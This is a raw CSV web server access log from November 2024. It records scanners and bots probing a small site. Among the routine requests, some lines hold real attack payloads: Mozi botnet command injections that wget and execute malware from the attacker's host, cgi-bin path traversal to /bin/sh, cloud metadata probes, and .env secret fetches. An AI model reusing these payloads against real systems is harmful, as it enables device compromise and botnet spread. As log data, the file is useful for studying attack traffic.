ip,date,method,endpoint,status,size
185.209.120.2,14/Nov/2024:18:00:20 +0000,GET,/,304,
185.209.120.2,14/Nov/2024:18:00:20 +0000,GET,/styles.css,304,
185.209.120.2,14/Nov/2024:18:00:23 +0000,GET,/,200,1755
185.209.120.2,14/Nov/2024:18:00:23 +0000,GET,/styles.css,200,1716
185.209.120.2,14/Nov/2024:18:00:24 +0000,GET,/,200,1755
185.209.120.2,14/Nov/2024:18:00:24 +0000,GET,/styles.css,200,1716
5.8.11.202,14/Nov/2024:21:32:19 +0000,GET,/,200,1755
94.156.248.4,14/Nov/2024:22:27:21 +0000,GET,/,200,1755
173.255.221.189,15/Nov/2024:00:35:31 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:08 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:30 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:34 +0000,,stats,400,226
185.242.226.80,15/Nov/2024:00:42:08 +0000,GET,/,200,1755
47.237.132.128,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
205.210.31.146,15/Nov/2024:06:04:26 +0000,GET,/,200,1755
194.50.16.198,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196
198.235.24.232,15/Nov/2024:09:00:04 +0000,GET,/,200,1755
5.8.11.202,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226
76.244.4.90,15/Nov/2024:09:27:03 +0000,HEAD,/,200,
5.8.11.202,15/Nov/2024:10:30:54 +0000,GET,/,200,1755
80.82.77.202,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226
185.209.120.3,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196
185.209.120.3,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196
5.8.11.202,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226
152.42.243.111,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196
205.210.31.15,15/Nov/2024:18:39:30 +0000,GET,/,200,1755
194.50.16.198,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196
152.42.219.47,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226
92.249.48.232,16/Nov/2024:02:48:27 +0000,GET,/,400,226
194.50.16.198,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196
152.42.136.45,16/Nov/2024:07:06:21 +0000,GET,/,200,1755
152.42.214.140,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196
152.42.214.140,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226
159.65.190.39,16/Nov/2024:12:55:57 +0000,GET,/,200,1755
159.65.190.39,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196
139.59.101.104,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196
194.50.16.198,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196
167.94.138.160,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226
152.42.214.140,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196
80.82.77.202,16/Nov/2024:19:25:30 +0000,GET,/,200,1755
8.222.151.66,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
205.210.31.164,16/Nov/2024:23:08:32 +0000,GET,/,200,1755
152.42.214.50,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226
152.42.214.140,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226
5.8.11.202,17/Nov/2024:01:44:28 +0000,GET,/,200,1755
222.254.217.214,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
14.167.198.63,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
93.174.93.12,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226
45.149.241.114,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196
114.33.126.55,17/Nov/2024:05:26:59 +0000,GET,/,200,1755
120.229.204.159,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196
152.42.174.244,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226
167.94.145.97,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226
93.174.93.12,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226
5.8.11.202,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226
125.229.134.120,17/Nov/2024:15:53:55 +0000,GET,/,200,1755
152.42.243.111,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196
152.42.243.111,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226
149.50.106.25,17/Nov/2024:16:54:02 +0000,GET,/,200,1755
95.214.55.79,17/Nov/2024:17:26:14 +0000,GET,/,200,1755
206.168.34.43,17/Nov/2024:17:47:01 +0000,GET,/,200,1755
185.191.126.248,17/Nov/2024:18:01:20 +0000,GET,/,200,1755
199.45.154.146,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226
199.45.154.146,17/Nov/2024:18:16:51 +0000,GET,/,200,1755
199.45.154.146,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196
92.255.57.150,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226
172.104.11.34,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226
205.210.31.18,17/Nov/2024:22:51:17 +0000,GET,/,200,1755
95.214.53.91,17/Nov/2024:22:52:45 +0000,GET,/,200,1755
159.223.67.34,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226
65.49.20.66,18/Nov/2024:03:19:59 +0000,GET,/,200,1755
65.49.20.66,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196
185.191.126.248,18/Nov/2024:05:00:12 +0000,GET,/,200,1755
185.191.126.248,18/Nov/2024:06:43:04 +0000,GET,/,200,1755
5.35.104.31,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196
93.174.93.12,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226
152.42.214.140,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226
159.223.67.34,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196
159.223.67.34,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226
178.128.54.126,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226
95.214.53.205,18/Nov/2024:10:05:14 +0000,GET,/,200,1755
194.50.16.198,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196
164.52.24.188,18/Nov/2024:14:34:03 +0000,GET,/,200,1755
164.52.24.188,18/Nov/2024:14:34:06 +0000,GET,/,200,1755
164.52.24.188,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196
164.52.24.188,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196
46.174.191.32,18/Nov/2024:14:41:18 +0000,GET,/,200,1755
152.42.243.206,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196
80.82.77.202,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226
93.174.93.12,18/Nov/2024:21:01:30 +0000,GET,/,200,1755
95.214.53.205,18/Nov/2024:21:45:35 +0000,GET,/,200,1755
205.210.31.220,18/Nov/2024:22:14:12 +0000,GET,/,200,1755
93.174.93.12,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226
159.223.69.51,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196
47.254.76.138,19/Nov/2024:01:18:33 +0000,GET,/,200,1755
47.89.193.239,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196
114.35.175.166,19/Nov/2024:02:23:21 +0000,GET,/,200,1755
167.94.138.43,19/Nov/2024:03:57:47 +0000,GET,/,200,1755
167.94.138.43,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196
5.8.11.202,19/Nov/2024:05:48:02 +0000,GET,/,200,1755
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/,200,1755
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196
205.210.31.19,19/Nov/2024:07:40:53 +0000,GET,/,200,1755
5.8.11.202,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226
152.42.214.50,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226
152.42.214.140,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226
95.214.55.79,19/Nov/2024:11:17:32 +0000,GET,/,200,1755
81.161.238.40,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196
5.8.11.202,19/Nov/2024:11:46:16 +0000,GET,/,200,1755
95.214.53.205,19/Nov/2024:14:03:31 +0000,GET,/,200,1755
139.162.164.128,19/Nov/2024:14:23:31 +0000,GET,/,200,1755
185.85.239.13,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226
194.50.16.198,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/,200,1755
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/styles.css,200,1716
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196
185.209.120.5,19/Nov/2024:17:25:43 +0000,GET,/,304,
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/,200,1755
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/styles.css,200,1716
95.214.53.205,19/Nov/2024:18:47:00 +0000,GET,/,200,1755
125.82.242.94,19/Nov/2024:20:16:26 +0000,,-,408,
194.50.16.198,19/Nov/2024:21:30:47 +0000,GET,/,200,1755
205.210.31.8,19/Nov/2024:22:20:38 +0000,GET,/,200,1755
198.235.24.143,19/Nov/2024:22:25:03 +0000,GET,/,200,1755
95.214.53.205,19/Nov/2024:23:10:41 +0000,GET,/,200,1755
106.75.65.201,20/Nov/2024:01:18:37 +0000,GET,/,200,1755
106.75.65.201,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226
106.75.65.201,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226
58.208.68.190,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196
45.84.89.3,20/Nov/2024:01:56:56 +0000,GET,/,200,1755
65.49.1.45,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226
5.79.184.27,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224
5.8.11.202,20/Nov/2024:03:45:10 +0000,GET,/,200,1755
1.34.111.115,20/Nov/2024:03:53:37 +0000,GET,/,200,1755
92.249.48.208,20/Nov/2024:04:43:35 +0000,GET,/,400,226
194.50.16.198,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196
185.191.126.248,20/Nov/2024:05:23:19 +0000,GET,/,200,1755
46.174.191.32,20/Nov/2024:05:47:13 +0000,GET,/,200,1755
93.174.93.12,20/Nov/2024:06:28:46 +0000,GET,/,200,1755
152.42.214.140,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226
92.255.57.58,20/Nov/2024:10:18:25 +0000,GET,/,200,1755
92.255.57.58,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196
92.255.57.58,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196
95.214.55.79,20/Nov/2024:12:59:43 +0000,GET,/,200,1755
139.59.101.104,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/,200,1755
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/,200,1755
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/styles.css,200,1716
185.209.120.11,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196
185.209.120.11,20/Nov/2024:15:27:57 +0000,GET,/,304,
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/,200,1755
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/styles.css,200,1716
185.209.120.11,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196
194.50.16.198,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196
104.209.35.51,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196
5.8.11.202,20/Nov/2024:18:01:36 +0000,GET,/,200,1755
5.8.11.202,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226
95.214.53.205,20/Nov/2024:18:58:40 +0000,GET,/,200,1755
172.105.78.45,20/Nov/2024:20:17:49 +0000,GET,/,200,1755
95.214.53.205,20/Nov/2024:20:40:49 +0000,GET,/,200,1755
81.214.143.203,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196
95.214.53.205,20/Nov/2024:21:48:02 +0000,GET,/,200,1755
5.8.11.202,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226
167.94.145.100,21/Nov/2024:01:27:57 +0000,GET,/,200,1755
170.64.239.33,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226
170.64.239.33,21/Nov/2024:03:13:00 +0000,GET,/,200,1755
170.64.239.33,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196
170.64.239.33,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196
170.64.239.33,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196
170.64.239.33,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196
45.84.89.2,21/Nov/2024:04:56:39 +0000,GET,/,200,1755
80.82.70.133,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226
80.82.77.202,21/Nov/2024:06:58:16 +0000,GET,/,200,1755
5.8.11.202,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226
5.8.11.202,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226
5.8.11.202,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196
167.94.138.52,21/Nov/2024:07:00:58 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:07:20:59 +0000,GET,/,200,1755
93.174.93.12,21/Nov/2024:07:32:52 +0000,GET,/,200,1755
159.223.69.51,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226
80.82.77.202,21/Nov/2024:10:32:12 +0000,GET,/,200,1755
47.245.119.234,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
125.228.198.247,21/Nov/2024:12:55:04 +0000,GET,/,200,1755
95.214.55.43,21/Nov/2024:13:39:45 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:14:02:38 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:14:44:17 +0000,GET,/,200,1755
152.42.247.210,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196
45.156.128.57,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226
45.156.128.56,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226
103.73.183.186,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196
5.8.11.202,21/Nov/2024:17:52:14 +0000,GET,/,200,1755
93.174.93.12,21/Nov/2024:20:18:46 +0000,GET,/,200,1755
185.82.219.179,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196
46.174.191.28,21/Nov/2024:22:34:07 +0000,GET,/,200,1755
194.50.16.198,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196
93.174.93.12,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226
47.237.132.148,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
173.255.221.189,22/Nov/2024:04:01:54 +0000,GET,/,200,1755
172.104.11.34,22/Nov/2024:04:02:00 +0000,GET,/,200,1755
205.210.31.134,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226
87.120.115.119,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196
45.84.89.2,22/Nov/2024:07:24:07 +0000,GET,/,200,1755
114.34.240.137,22/Nov/2024:08:26:14 +0000,GET,/,200,1755
159.223.69.51,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226
152.42.243.206,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196
152.42.243.206,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226
5.8.11.202,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226
205.210.31.143,22/Nov/2024:09:24:09 +0000,GET,/,200,1755
178.20.129.78,22/Nov/2024:10:10:46 +0000,GET,/,200,1755
159.89.172.232,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196
209.38.98.23,22/Nov/2024:10:15:23 +0000,GET,/,200,1755
185.191.126.248,22/Nov/2024:10:33:31 +0000,GET,/,200,1755
95.214.55.43,22/Nov/2024:10:40:26 +0000,GET,/,200,1755
80.82.77.202,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226
148.153.56.82,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196
64.62.156.69,22/Nov/2024:13:22:40 +0000,GET,/,200,1755
64.62.156.71,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196
